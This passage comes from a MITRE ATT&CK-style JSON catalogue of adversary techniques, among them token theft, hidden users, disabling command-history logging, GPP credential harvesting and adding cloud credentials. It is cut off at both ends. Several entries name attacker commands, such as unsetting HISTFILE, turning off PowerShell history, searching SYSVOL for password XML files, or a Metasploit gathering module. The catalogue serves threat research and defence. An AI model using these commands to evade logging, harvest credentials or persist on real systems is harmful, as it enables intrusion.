Group","Confucius","IndigoZebra","POLONIUM","APT32","Kimsuky","TA2541","Magic Hound","LazyScripter"]},"T1528":{"id":"T1528","name":"Steal Application Access Token","description":"Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).^[[1]](https://auth0.com/blog/why-should-use-accesstokens-to-secure-an-api/)^ OAuth is one commonly implemented framework that issues tokens to users for access to systems. Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.\n\nIn Kubernetes environments, processes running inside a container communicate with the Kubernetes API server using service account tokens. If a container is compromised, an attacker may be able to steal the container’s token and thereby gain access to Kubernetes API commands.^[[2]](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)^\n\nToken theft can also occur through social engineering, in which case user action may be required to grant access. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.^[[3]](https://docs.microsoft.com/en-us/azure/active-directory/develop/active-directory-v2-protocols)^^[[4]](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow)^ An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. \n \nAdversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.^[[5]](https://www.amnesty.org/en/latest/research/2019/08/evolving-phishing-attacks-targeting-journalists-and-human-rights-defenders-from-the-middle-east-and-north-africa/)^^[[6]](https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks)^ The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.^[[7]](https://docs.microsoft.com/en-us/azure/active-directory/develop/quickstart-register-app)^ Then, they can send a [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1550/001).^[[8]](https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens)^\n\nApplication access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens^[[9]](https://auth0.com/learn/refresh-tokens/)^, allowing them to obtain new access tokens without prompting the user.  \n\n","platforms":["SaaS","Office 365","Azure AD","Google Workspace","Containers"],"tactics":["Credential Access"],"campaigns":[],"groups":["APT28"]},"T1598.002":{"id":"T1598.002","name":"Spearphishing Attachment","description":"Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file.^[[1]](https://nakedsecurity.sophos.com/2020/10/02/serious-security-phishing-without-links-when-phishers-bring-along-their-own-web-pages/)^^[[2]](https://github.com/ryhanson/phishery)^ The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["Dragonfly","Sidewinder","SideCopy"]},"T1098.001":{"id":"T1098.001","name":"Additional Cloud Credentials","description":"Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.^[[1]](https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/)^^[[2]](https://speakerdeck.com/tweekfawkes/blue-cloud-of-death-red-teaming-azure-1)^^[[3]](https://www.youtube.com/watch?v=wQ1CuAPnrLM&feature=youtu.be&t=2815)^ These credentials include both x509 keys and passwords.^[[1]](https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/)^ With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.^[[4]](https://nedinthecloud.com/2019/07/16/demystifying-azure-ad-service-principals/)^\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the `CreateKeyPair` or `ImportKeyPair` API in AWS or the `gcloud compute os-login ssh-keys add` command in GCP.^[[5]](https://cloud.google.com/sdk/gcloud/reference/compute/os-login/ssh-keys/add)^ This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.^[[6]](https://expel.io/blog/finding-evil-in-aws/)^^[[7]](https://expel.io/blog/behind-the-scenes-expel-soc-alert-aws/)^\n\nAdversaries may also use the `CreateAccessKey` API in AWS or the `gcloud iam service-accounts keys create` command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).^[[8]](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)^^[[9]](https://sysdig.com/blog/scarleteel-2-0/)^ For example, in Azure AD environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal’s roles and permissions, which may be different from those of the Application Administrator.^[[10]](https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5)^ \n\nIn AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials tied to the permissions of the original user account. These credentials may remain valid for the duration of their lifetime even if the original account’s API credentials are deactivated.\n^[[11]](https://www.crowdstrike.com/blog/how-adversaries-persist-with-aws-user-federation/)^","platforms":["IaaS","Azure AD","SaaS"],"tactics":["Persistence","Privilege Escalation"],"campaigns":["C0027","SolarWinds Compromise"],"groups":["APT29","UNC2452"]},"T1204":{"id":"T1204","name":"User Execution","description":"An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary, or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204). For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).^[[1]](https://www.proofpoint.com/us/blog/threat-insight/caught-beneath-landline-411-telephone-oriented-attack-delivery)^","platforms":["Linux","Windows","macOS","IaaS","Containers"],"tactics":["Execution"],"campaigns":[],"groups":["LAPSUS$","Magic Hound"]},"T1491.001":{"id":"T1491.001","name":"Internal Defacement","description":"An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.^[[1]](https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)^ Disturbing or offensive images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.^[[2]](https://web.archive.org/web/20160303200515/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf)^","platforms":["Linux","macOS","Windows"],"tactics":["Impact"],"campaigns":[],"groups":["Gamaredon Group","Lazarus Group"]},"T1564.002":{"id":"T1564.002","name":"Hidden Users","description":"Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. \n\nIn macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value `Hide500Users` to `TRUE` in the `/Library/Preferences/com.apple.loginwindow` plist file.^[[1]](https://cdn2.hubspot.net/hubfs/3354902/Content%20PDFs/Cybereason-Lab-Analysis-OSX-Pirrit-4-6-16.pdf)^ Every user has a userID associated with it. When the `Hide500Users` key value is set to `TRUE`, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the `dscl` utility to create hidden user accounts by setting the `IsHidden` attribute to `1`. Adversaries can also hide a user’s home folder by changing the `chflags` to hidden.^[[2]](https://support.apple.com/en-us/HT203998)^ \n\nAdversaries may similarly hide user accounts in Windows. Adversaries can set the `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList` Registry key value to `0` for a specific user to prevent that user from being listed on the logon screen.^[[3]](https://www.fireeye.com/blog/threat-research/2021/06/darkside-affiliate-supply-chain-software-compromise.html)^^[[4]](https://www.us-cert.gov/ncas/alerts/TA18-074A)^\n\nOn Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the `gsettings` command (ex: `sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true`).^[[5]](https://ubuntuhandbook.org/index.php/2021/06/hide-user-accounts-ubuntu-20-04-login-screen/)^ Display Managers are not anchored to specific distributions and may be changed by a user or adversary.","platforms":["macOS","Windows","Linux"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Dragonfly","Kimsuky","Dragonfly 2.0"]},"T1134.003":{"id":"T1134.003","name":"Make and Impersonate Token","description":"Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function. The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.\n\nThis behavior is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) in that this refers to creating a new user token instead of stealing or duplicating an existing one.","platforms":["Windows"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":[],"groups":["FIN13"]},"T1552.006":{"id":"T1552.006","name":"Group Policy Preferences","description":"Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.^[[1]](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v%3Dws.11))^\n\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).^[[2]](https://msdn.microsoft.com/library/cc422924.aspx)^\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit’s post exploitation module: `post/windows/gather/credentials/gpp`\n* Get-GPPPassword^[[3]](https://obscuresecurity.blogspot.co.uk/2012/05/gpp-password-retrieval-with-powershell.html)^\n* gpprefdecrypt.py\n\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: `dir /s * .xml`\n","platforms":["Windows"],"tactics":["Credential Access"],"campaigns":[],"groups":["APT33","Wizard Spider"]},"T1048.002":{"id":"T1048.002","name":"Exfiltration Over Asymmetric Encrypted Non-C2 Protocol","description":"Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. \n\nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. ","platforms":["Linux","macOS","Windows"],"tactics":["Exfiltration"],"campaigns":["SolarWinds Compromise"],"groups":["APT28","APT29","UNC2452"]},"T1087.004":{"id":"T1087.004","name":"Cloud Account","description":"Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.\n\nWith authenticated access there are several tools that can be used to find accounts. The `Get-MsolRoleMember` PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.^[[1]](https://docs.microsoft.com/en-us/powershell/module/msonline/get-msolrolemember?view=azureadps-1.0)^^[[2]](https://github.com/True-Demon/raindance)^ The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command `az ad user list` will list all users within a domain.^[[3]](https://docs.microsoft.com/en-us/cli/azure/ad/user?view=azure-cli-latest)^^[[4]](https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/)^ \n\nThe AWS command `aws iam list-users` may be used to obtain a list of users in the current account while `aws iam list-roles` can obtain IAM roles that have a specified path prefix.^[[5]](https://docs.aws.amazon.com/cli/latest/reference/iam/list-roles.html)^^[[6]](https://docs.aws.amazon.com/cli/latest/reference/iam/list-users.html)^ In GCP, `gcloud iam service-accounts list` and `gcloud projects get-iam-policy` may be used to obtain a listing of service accounts and users in a project.^[[7]](https://cloud.google.com/sdk/gcloud/reference/iam/service-accounts/list)^","platforms":["Azure AD","Office 365","SaaS","IaaS","Google Workspace"],"tactics":["Discovery"],"campaigns":["C0027"],"groups":["APT29"]},"T1057":{"id":"T1057","name":"Process Discovery","description":"Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or `Get-Process` via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as `CreateToolhelp32Snapshot`. In Mac and Linux, this is accomplished with the `ps` command. Adversaries may also opt to enumerate processes via /proc.\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show processes` can be used to display current running processes.^[[1]](https://www.us-cert.gov/ncas/alerts/TA18-106A)^^[[2]](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/show_monitor_permit_list_through_show_process_memory.html#wp3599497760)^","platforms":["Linux","macOS","Windows","Network"],"tactics":["Discovery"],"campaigns":["Frankenstein","SolarWinds Compromise","C0015","FunnyDream","Operation Honeybee","Operation CuckooBees","Operation Wocao"],"groups":["Windshift","Volt Typhoon","Tropic Trooper","Sidewinder","Deep Panda","APT1","HAFNIUM","Darkhotel","Stealth Falcon","TeamTNT","APT28","Chimera","Andariel","Lazarus Group","Molerats","Earth Lusca","Mustang Panda","Turla","MuddyWater","Rocke","Magic Hound","APT37","Kimsuky","Higaisa","Poseidon Group","Ke3chang","HEXANE","Inception","OilRig","APT3","Gamaredon Group","Winnti Group","APT38","APT29","UNC2452","Operation Wocao","Frankenstein","Honeybee"]},"T1562.003":{"id":"T1562.003","name":"Impair Command History Logging","description":"Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable `HISTFILE`. When a user logs off a system, this information is flushed to a file in the user's home directory called `~/.bash_history`. The `HISTCONTROL` environment variable keeps track of what should be saved by the `history` command and eventually into the `~/.bash_history` file when a user logs out. `HISTCONTROL` does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (`unset HISTFILE`) or set the command history size to zero (`export HISTFILESIZE=0`) to prevent logging of commands. Additionally, `HISTCONTROL` can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". `HISTCONTROL` can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the `PSReadLine` module tracks commands used in all PowerShell sessions and writes them to a file (`$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt` by default). Adversaries may change where these logs are saved using `Set-PSReadLineOption -HistorySavePath {File Path}`. This will cause `ConsoleHost_history.txt` to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command `Set-PSReadlineOption -HistorySaveStyle SaveNothing`.^[[1]](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_history?view=powershell-7)^^[[2]](https://community.sophos.com/products/intercept/early-access-program/f/live-discover-response-queries/121529/live-discover---powershell-command-audit)^^[[3]](https://community.sophos.com/products/malware/b/blog/posts/powershell-command-history-forensics)^\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. `no logging`).","platforms":["Linux","macOS","Windows","Network"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["APT38"]},"T1556.008":{"id":"T1556.008","name":"Network Provider DLL","description":"Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions.^[[1]](https://learn.microsoft.com/en-us/windows/win32/secauthn/network-provider-api)^ During the logon process, Winlogon (the interactive logon module) sends credentials to the local `mpnotify.exe` process via RPC. The `mpnotify.exe` process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.^[[2]](https://www.huntress.com/blog/cleartext-shenanigans-gifting-user-passwords-to-adversaries-with-nppspy)^^[[3]](https://www.youtube.com/watch?v=ggY3srD9dYs)^^[[4]](https://learn.microsoft.com/en-us/windows/win32/api/npapi/nf-npapi-nplogonnotify)^ \n\nAdversaries can configure a malicious network provider DLL to receive credentials from `mpnotify.exe`.^[[5]](https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy)^ Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the `NPLogonNotify()` function.^[[4]](https://learn.microsoft.com/en-us/windows/win32/api/npapi/nf-npapi-nplogonnotify)^\n\nAdversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.^[[2]](https://www.huntress.com/blog/cleartext-shenanigans-gifting-user-passwords-to-adversaries-with-nppspy)^","platforms":["Windows"],"tactics":["Credential Access","Defense Evasion","Persistence"],"campaigns":[],"groups":[]},"T1546.003":{"id":"T1546.003","name":"Windows Management Instrumentation Event Subscription","description":"Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime.^[[1]](https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf)^\n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.^[[2]](https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf)^^[[3]](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf)^ Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.^[[4]](https://www.secureworks.com/blog/wmi-persistence)^^[[5]](https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-)^\n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.","platforms":["Windows"],"tactics":["Privilege Escalation","Persistence"],"campaigns":["SolarWinds Compromise","Operation Ghost"],"groups":["Blue Mockingbird","APT29","FIN8","Leviathan","Turla","Metador","APT33","Mustang Panda","UNC2452"]},"T1596.004":{"id":"T1596.004","name":"CDNs","description":"Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor’s geographical region.\n\nAdversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization’s website.^[[1]](https://www.digitalshadows.com/blog-and-research/content-delivery-networks-cdns-can-leave-you-exposed-how-you-might-be-affected-and-what-you-can-do-about-it/)^ Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":[]},"T1497.002":{"id":"T1497.002","name":"User Activity Based Checks","description":"Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.^[[1]](https://drive.google.com/file/d/1t0jn3xr4ff2fR30oQAUn_RsWSnMpOAQc)^\n\nAdversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks ^[[2]](https://www.sans.org/reading-room/whitepapers/forensics/detecting-malware-sandbox-evasion-techniques-36667)^ , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro ^[[3]](https://unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/)^ or waiting for a user to double click on an embedded image to activate.^[[4]](https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html)^ ","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion","Discovery"],"campaigns":[],"groups":["Darkhotel","FIN7"]},"T1585.003":{"id":"T1585.003","name":"Cloud Accounts","description":"Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.^[[1]](https://awakesecurity.com/blog/threat-hunting-series-detecting-command-control-in-the-cloud/)^\n\nCreating [Cloud Accounts](https://attack.mitre.org/techniques/T1585/003) may also require adversaries to establish [Email Accounts](https://attack.mitre.org/techniques/T1585/002) to register with the cloud provider. ","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":[]},"T1072":{"id":"T1072","name":"Software Deployment Tools","description":"Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, HBSS, Altiris, etc.).  \n\nAccess to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints. Network infrastructure may also have administration tools that can be similarly abused by adversaries. ^[[1]](https://www.mandiant.com/resources/blog/fortinet-malware-ecosystem)^\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.","platforms":["Linux","macOS","Windows","Network"],"tactics":["Execution","Lateral Movement"],"campaigns":["C0018"],"groups":["APT32","Sandworm Team","Silence","Threat Group-1314"]},"T1041":{"id":"T1041","name":"Exfiltration Over C2 Channel","description":"Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.","platforms":["Linux","macOS","Windows"],"tactics":["Exfiltration"],"campaigns":["C0017","Operation Honeybee","Operation Dream Job","Operation Wocao","Frankenstein"],"groups":["LuminousMoth","Sandworm Team","Chimera","GALLIUM","Higaisa","Ke3chang","APT39","Lazarus Group","APT3","APT32","Kimsuky","ZIRCONIUM","Confucius","Wizard Spider","Leviathan","Gamaredon Group","MuddyWater","Stealth Falcon","Frankenstein","Operation Wocao"]},"T1134.004":{"id":"T1134.004","name":"Parent PID Spoofing","description":"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the `CreateProcess` API call, which supports a parameter that defines the PPID to use.^[[1]](https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/)^ This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via `svchost.exe` or `consent.exe`) rather than the current user context.^[[2]](https://docs.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)^\n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be `explorer.exe` rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).^[[3]](https://www.countercept.com/blog/detecting-parent-pid-spoofing/)^ This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).^[[4]](https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/)^^[[3]](https://www.countercept.com/blog/detecting-parent-pid-spoofing/)^\n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as `lsass.exe`), causing the new process to be elevated via the inherited access token.^[[5]](https://blog.xpnsec.com/becoming-system/)^","platforms":["Windows"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":[],"groups":[]},"T1591":{"id":"T1591","name":"Gather Victim Org Information","description":"Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).^[[1]](https://threatpost.com/broadvoice-leaks-350m-records-voicemail-transcripts/160158/)^^[[2]](https://www.sec.gov/edgar/search-and-access)^ Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":["Operation Dream Job"],"groups":["Lazarus Group","Kimsuky"]},"T1606":{"id":"T1606","name":"Forge Web Credentials","description":"Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.\n\nAdversaries may generate these credential materials in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), [Steal Application Access Token](https://attack.mitre.org/techniques/T1528), and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nThe generation of web credentials often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed 